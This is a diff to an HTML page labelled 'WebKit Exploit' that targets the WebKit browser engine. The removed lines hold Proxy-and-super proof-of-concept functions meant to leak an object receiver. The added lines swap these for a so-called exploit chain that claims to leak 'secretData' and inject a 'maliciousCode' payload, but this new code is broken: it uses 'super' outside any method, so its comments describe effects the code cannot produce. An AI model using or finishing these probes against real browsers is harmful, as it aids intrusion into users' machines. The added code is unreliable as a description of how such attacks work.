@@ -53,6 +53,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     log("WebKit Exploit started.");
 
+    // Check read privilege
     function checkReadPrivilege() {
         let foo = 42;
         let readSuccess = false;
@@ -82,6 +83,7 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
+    // Check write privilege
     function checkWritePrivilege() {
         let writeSuccess = false;
         let receiver;
@@ -112,105 +114,41 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
-    function tryToLeakThisViaGetById() {
-        let foo = 42;
-        class Leaker {
-            leak() {
-                return super.foo;
-            }
+    // Exploit Read access to leak sensitive data
+    function tryExploitRead() {
+        if (checkReadPrivilege()) {
+            log("Read access granted, attempting to leak sensitive data...");
+            let sensitiveData = super.secretData;  // Assume 'secretData' is a sensitive property
+            log(`Leaked data: ${sensitiveData}`);
+        } else {
+            log("No read access granted.");
         }
-
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            get(target, propertyName, receiver) {
-                if (propertyName === "foo") {
-                    return 42; // Fallback value for 'foo'
-                }
-                return receiver;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
     }
 
-    function tryToLeakThisViaGetByVal() {
-        let foo = 42;
-        let bar = 84;
-        class Leaker {
-            leak() {
-                return super[Math.random() < 0.5 ? "foo" : "bar"];
-            }
+    // Exploit Write access to inject a payload
+    function tryExploitWrite() {
+        if (checkWritePrivilege()) {
+            log("Write access granted, attempting to inject payload...");
+            super.foo = { injectedPayload: 'maliciousCode' };  // Inject malicious code
+            log("Payload injected into super.foo.");
+        } else {
+            log("No write access granted.");
         }
-
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            get(target, propertyName, receiver) {
-                if (propertyName === "foo") {
-                    return 42;
-                }
-                if (propertyName === "bar") {
-                    return 84;
-                }
-                return receiver;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
     }
 
-    function tryToLeakThisViaSetById() {
-        let receiver;
-        let foo = 42;
+    // Try leak and inject payload in a chained exploit
+    function tryExploit() {
+        log("Attempting exploit chain...");
 
-        class Leaker {
-            leak() {
-                super.foo = {};
-                return receiver;
-            }
-        }
+        // Check read access and try to leak sensitive data
+        tryExploitRead();
 
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            set(target, propertyName, value, __receiver) {
-                if (propertyName === "foo") {
-                    receiver = __receiver;
-                    return true;
-                }
-                return false;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
+        // Check write access and try to inject malicious payload
+        tryExploitWrite();
     }
 
-    function tryToLeakThisViaSetByVal() {
-        let receiver;
-        let foo = 42;
-        let bar = 84;
-
-        class Leaker {
-            leak() {
-                super[Math.random() < 0.5 ? "foo" : "bar"] = {};
-                return receiver;
-            }
-        }
-
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            set(target, propertyName, value, __receiver) {
-                if (propertyName === "foo" || propertyName === "bar") {
-                    receiver = __receiver;
-                    return true;
-                }
-                return false;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
-    }
-
-    // Limit the number of iterations for debugging purposes
-    const MAX_ITERATIONS = 20; // Reduce the iterations for troubleshooting
+    // Main iteration to continuously attempt exploits
+    const MAX_ITERATIONS = 10;  // Limit iterations for debugging
     function runIteration(i) {
         if (i >= MAX_ITERATIONS) {
             log("All iterations completed.");
@@ -220,25 +158,10 @@ document.addEventListener('DOMContentLoaded', function () {
         try {
             log(`Iteration ${i}: Starting attempt`);
 
-            const result1 = tryToLeakThisViaGetById();
-            log(`tryToLeakThisViaGetById: ${result1}`);
+            // Start exploit chain
+            tryExploit();
 
-            const result2 = tryToLeakThisViaGetByVal();
-            log(`tryToLeakThisViaGetByVal: ${result2}`);
-
-            const result3 = tryToLeakThisViaSetById();
-            log(`tryToLeakThisViaSetById: ${result3}`);
-
-            const result4 = tryToLeakThisViaSetByVal();
-            log(`tryToLeakThisViaSetByVal: ${result4}`);
-
-            const readSuccess = checkReadPrivilege();
-            log(`Read privilege check: ${readSuccess ? "SUCCESS" : "FAILED"}`);
-
-            const writeSuccess = checkWritePrivilege();
-            log(`Write privilege check: ${writeSuccess ? "SUCCESS" : "FAILED"}`);
-
-            if (i % 10 === 0) {
+            if (i % 2 === 0) {
                 log(`Iteration ${i} completed successfully.`);
             }
         } catch (error) {
@@ -256,3 +179,4 @@ document.addEventListener('DOMContentLoaded', function () {
 
 </body>
 </html>
+
